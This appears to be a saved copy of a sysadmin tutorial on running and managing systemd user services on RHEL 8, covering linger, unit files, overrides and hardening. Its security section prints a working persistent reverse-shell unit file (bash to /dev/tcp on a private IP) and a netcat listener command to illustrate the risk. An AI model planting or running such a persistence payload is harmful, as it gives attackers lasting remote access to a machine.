# **[SystemD User services](https://www.unixsysadmin.com/systemd-user-services/)**

**[Current Tasks](../../../a_status/current_tasks.md)**\
**[Research List](../../research_list.md)**\
**[Back Main](../../../README.md)**

![i1](https://www.unixsysadmin.com/wp-content/uploads/sites/3/2020/05/systemd-user-services.png)

Since it’s initial release in 2010, systemd has found it’s way into the majority of Linux distributions and introduced a standard way of configuring and managing services. RHEL 8 includes systemd version 239 and introduced many new features such as:

- Unprivileged unit files
- Dynamic users
- Improvements to systemctl and journalctl
- Resource management with cgroup v2

The above features are all well and fine, especially if you are system administrator and managing these services in large, enterprise environments. However, how can you give some of these powerful tools to your users without resorting to bespoke sudo rules? User services!

## What are user services?

systemd offers users the ability to manage services under the user’s control with a per-user systemd instance, enabling users to start, stop, enable, and disable their own units.

<https://wiki.archlinux.org/index.php/Systemd/User>

## The problem

A software package from a vendor will typically come in the form of a tarball or RPM with the expectation that the service will be installed and run as the root user. Historically, it would have installed some control scripts into /etc/init.d or /usr/lib/systemd/system and a corresponding set of configuration files, perhaps somewhere under /etc or /opt. As the administrator of the server, you will typically need to come up with some sudo rules to allow the package to be managed, the configuration to be set and the service to controlled. You may end up with something like this in /etc/sudoers:

Cmnd_Alias APP_CMDS = /usr/bin/systemctl start app_service, /usr/bin/systemctl stop app_service, /usr/bin/systemctl enable app_service, /usr/bin/systemctl disable app_service
unprivileged_user ALL=(ALL) NOPASSWD: APP_CMDS
unpriveleged_user ALL = NOPASSWD: sudoedit /etc/app.conf, sudoedit /etc/systemd/system/app.d/app.conf

The /etc/sudoers file controls who can run what commands as what users on what machines and can also control special things such as whether you need a password for particular commands
<https://www.linuxfoundation.org/blog/blog/classic-sysadmin-configuring-the-linux-sudoers-file>

The problem with this solution is that it does not scale: every application will have a different name, different configuration files and different requirements.

## What we want

We want to give our users the ability to run and manage their own services. If we trust a user to login to the server (and we have good policies controlling this!) then we should let them run the services they need and not get in their way.

## The solution

We create an application account which will run the application, and we’ll enable the ‘linger‘ functionality so that the account can use systemd services without being logged in:

```bash
[root@rhel8 ] useradd -d /home/myapp -m -s /bin/bash -c "My application account" myapp
[root@rhel8 ] loginctl enable-linger myapp
```

Optionally, set a password or a sudo rule to allow a user to access this account. But that’s it. Assuming we have enough space under /home/myapp for the application, that’s all the setup we need.

## Creating the user system service

As the ‘myapp’ account we can create a systemd user service directly. (Note, it may be possible to create a new unit file with systemctl --user edit --force myapp.service, but I found this syntax only created the drop-in file, not the service file). Let’s create the service manually:

```bash
[myapp@rhel8 ~]$ mkdir -p ~/.config/systemd/user/
[myapp@rhel8 ~]$ vi ~/.config/systemd/user/myapp.service
```

In the editor you can now create a systemd unit file. You can take a look at the installed files in /usr/lib/systemd/system or perhaps you have an existing application that already documents it’s requirements. As an example, let’s create a dummy web service that listens on port 8080.

```bash
[Unit]
Description=My demo application

[Service]
ExecStart=/usr/bin/python3 -m http.server 8080
WorkingDirectory=/home/myapp/html
And let’s create some content so that we can test this works
```

```bash
[myapp@rhel8 ~]$ mkdir /home/myapp/html
[myapp@rhel8 ~]$ echo "Hello World" > /home/myapp/html/index.html
```

By default the demo application can’t be seen by systemd:

```bash
[myapp@rhel8 ~]$ systemctl --user status myapp.service
Unit myapp.service could not be found.
```

You’ll first need to reload systemd so that it can pick up the unit file.

```bash
[myapp@rhel8 ~]$ systemctl --user daemon-reload
[myapp@rhel8 ~]$ systemctl --user status myapp.service
● myapp.service - My demo application
   Loaded: loaded (/home/myapp/.config/systemd/user/myapp.service; static; vendor preset: enabled)
   Active: inactive (dead)
```

The service is disabled by default but let’s try to start it.

```bash
[myapp@guest01 ~]$ systemctl --user start myapp.service
[myapp@guest01 ~]$ systemctl --user status myapp.service
● myapp.service - My demo application
   Loaded: loaded (/home/myapp/.config/systemd/user/myapp.service; static; vendor preset: enabled)
   Active: active (running) since Tue 2020-05-26 12:28:04 BST; 1s ago
 Main PID: 1169 (python3)
   CGroup: /user.slice/user-1001.slice/user@1001.service/myapp.service
           └─1169 /usr/bin/python3 -m http.server 8080
```

## Environment variables

Units started by **user instance of systemd do not inherit any of the environment variables set in places like .bashrc etc.** There are several ways to set environment variables for them:

- For users with a $HOME directory, create a .conf file in the ~/.config/environment.d/ directory with lines of the form NAME=VAL. Affects only that user's user unit. See environment.d(5) for more information.
- Use the DefaultEnvironment option in /etc/systemd/user.conf file. Affects all user units.
- Add a drop-in configuration file in /etc/systemd/system/user@UID.service.d/, see #Service example
- Add a drop-in configuration file in /etc/systemd/system/user@.service.d/ (affects all users), see #Service example
- At any time, use systemctl --user set-environment or systemctl --user import-environment. Affects all user units started after setting the environment variables, but not the units that were already running.
- Using the dbus-update-activation-environment --systemd --all command provided by dbus. Has the same effect as systemctl --user import-environment, but also affects the D-Bus session. You can add this to the end of your shell initialization file.
- For "global" environment variables for the user environment you can use the environment.d directories which are parsed by some generators. See environment.d(5) and systemd.generator(7) for more information.
- You can also write a systemd.environment-generator(7) script which can produce environment variables that vary from user to user, this is probably the best way if you need per-user environments (this is the case for XDG_RUNTIME_DIR, DBUS_SESSION_BUS_ADDRESS, etc).
One variable you may want to set is PATH.

After configuration, the command systemctl --user show-environment can be used to verify that the values are correct. You may need to run systemctl --user daemon-reload for changes to take effect immediately.

## Starting the service at boot time

Like any systemd service, you can configure your application to start at boot time, provided you have the correct entries in your unit file. My demo application was missing the required definitions, so let’s see what happens when I try to enable it.

```bash
[myapp@rhel8 ~]$ systemctl --user enable myapp.service
The unit files have no installation config (WantedBy, RequiredBy, Also, Alias
settings in the [Install] section, and DefaultInstance for template units).
This means they are not meant to be enabled using systemctl.
Possible reasons for having this kind of units are:
1) A unit may be statically enabled by being symlinked from another unit's
   .wants/ or .requires/ directory.
2) A unit's purpose may be to act as a helper for some other unit which has
   a requirement dependency on it.
3) A unit may be started when needed via activation (socket, path, timer,
   D-Bus, udev, scripted systemctl call, ...).
4) In case of template units, the unit is meant to be enabled with some
   instance name specified.
```

Here we see that I neglected to include a “Install” stanza in my unit file. I can either edit /home/myapp/.config/systemd/user/myapp.service or I can include a local override. Rather than edit the myapp.service file, let’s use the systemctl edit function to demonstrate creating an override or drop-in:

```bash
[myapp@rhel8 ~]$ systemctl --user edit myapp.service
```

An editor will appear and we can insert the following:

[Install]
WantedBy=default.target

Now, we can enable the service:

```bash
[myapp@rhel8 ~]$ systemctl enable --user myapp
Created symlink /home/myapp/.config/systemd/user/default.target.wants/myapp.service → /home/myapp/.config/systemd/user/myapp.service.
[myapp@rhel8 ~]$ systemctl status --user myapp
● myapp.service - My demo application
   Loaded: loaded (/home/myapp/.config/systemd/user/myapp.service; enabled; vendor preset: enabled)
  Drop-In: /home/myapp/.config/systemd/user/myapp.service.d
           └─override.conf
   Active: active (running) since Tue 2020-05-26 12:28:04 BST; 8min ago
 Main PID: 1169 (python3)
   CGroup: /user.slice/user-1001.slice/user@1001.service/myapp.service
           └─1169 /usr/bin/python3 -m http.server 8080
```

Note that a number of things have happened here.

- A symlink is created within my application account area /home/myapp/.config/systemd/user/default.target.wants pointing at myapp.service
- A Drop-In override is created in /home/myapp/.config/systemd/user/myapp.service.d/override.conf

If the server is rebooted, the application will start at boot
We don’t need to include .service suffix in the systemctl enable command, systemd defaults to service contol

## Handling errors

The very nice part of systemd is that you can decide what should happen when a service fails. Perhaps there is a the risk of data loss so you want a service to stop and wait for manual intervention for recovery. Or perhaps there was a temporary network glitch and you want the application to restart. As with the Operating System services you can include directives as to what should happen on error events. For example, adding these lines to the Service stanza means that the application attempts to restart every 60 seconds should it fail.

```bash
Restart=always
RestartSec=60
```

## Out of the box bonus

Using systemd user services we’ve now got access to tools such as systemd-analyze security:

`[myapp@rhel8 ~] systemd-analyze --user security myapp.service`

![i2](https://www.unixsysadmin.com/wp-content/uploads/sites/3/2020/05/systemd_user_services-894x1024.png)

We can see that our proof of concept is very insecure, but we can also see ways to fix it. For example, it flags that the “Service has access to other software’s temporary files” and the fix is to set the PrivateTmp variable. So we’d fix this by adjusting the service file so it reads:

```bash
[Unit]
Description=My demo application

[Service]
ExecStart=/usr/bin/python3 -m http.server 8080
WorkingDirectory=/home/myapp/html
PrivateTmp=1
```

Checking the status, we see that we need to reload the daemon following our edit:

```bash
[myapp@rhel8 ~] systemctl --user status myapp.service
Warning: The unit file, source configuration file or drop-ins of myapp.service changed on disk. Run 'systemctl --user daemon-reload' to reload units.
● myapp.service - My demo application
   Loaded: loaded (/home/myapp/.config/systemd/user/myapp.service; enabled; vendor preset: enabled)
  Drop-In: /home/myapp/.config/systemd/user/myapp.service.d
           └─override.conf
   Active: active (running) since Tue 2020-05-26 12:41:16 BST; 20min ago
 Main PID: 949 (python3)
   CGroup: /user.slice/user-1001.slice/user@1001.service/myapp.service
           └─949 /usr/bin/python3 -m http.server 8080
```

Let’s reload systemd:

```bash
[myapp@rhel8 ~] systemctl --user daemon-reload
[myapp@rhel8 ~] systemctl --user status myapp.service
● myapp.service - My demo application
   Loaded: loaded (/home/myapp/.config/systemd/user/myapp.service; enabled; vendor preset: enabled)
  Drop-In: /home/myapp/.config/systemd/user/myapp.service.d
           └─override.conf
   Active: active (running) since Tue 2020-05-26 12:41:16 BST; 21min ago
 Main PID: 949 (python3)
   CGroup: /user.slice/user-1001.slice/user@1001.service/myapp.service
           └─949 /usr/bin/python3 -m http.server 8080
```

Not that the service remains active, but the security report will now show the service is using a private temporary area. (Question: should the application have restarted?)

## Security

All of the above assumes that access to your application account is controlled. However, what if an application is insecure and it’s somehow possible for an attacker to write to the filesystem as that account? Well, if they can indeed do that, it’s possible to see that they might install a malicious service such as a reverse SSH shell. Here’s what this might look like:

```bash
[myapp@rhel8 ~] cat /home/myapp/.config/systemd/user/malicious.service
[Unit]
Description=Malicious service

[Service]
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.142/9888 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
```

The ‘restart’ feature of systemd will mean that the shell continuously tries to reach out to the attacker at 192.168.1.142 on port 9888. And worst of all, this type of attack will persist through reboots (remember, we normally want legitimate services to start on boot!). All the user on 192.168.1.142 needs to do is run nc -l -v 192.168.1.142 9888 and a remote shell will be opened up with access to the myapp account. For further advice on mitigating reverse shells, take a look at Understanding Reverse Shells. Consider using a local firewall rules that prevents new outbound connections from being made to unknown destinations.

Don’t let the above dissuade you from using user services. A vulnerable application is always a risk, and any user that has access to a server might be able to manually start reverse shells. Local security policy, sensible firewall controls and monitoring of your environment mitigates against this.

## Useful links

You may find you are not able to control a systemd user service if you log into the server as one user, and then switch to another account via ‘sudo’. If so, take a read through **[How to execute “systemctl –user” as a different user](https://access.redhat.com/solutions/4661741)**.

Privileged users such as root (or those in the wheel group) are unable to manage systemd user instances directly. An RFE has been raised for this, see:

Bugzilla 1795555 – Provide a way for privileged users to interact with systemd user instances
systemctl -M <user@.host> VERB should work
Similarly, if you want to control user services through Cockpit, you’ll need to await the following RFE:

Bug 1792270 – [RFE] Display “User Services” tab in Services panel
list user services

## Summary

systemd user services are really awesome! They allow users to take advantage of the benefits of systemd and control how their applications are run. An application team can define dependencies and startup ordering using their own user accounts without fear of impacting the O/S system services. It can help loosen the friction between support teams and allow applications to be written, deployed and managed without requiring root access.

Post navigation
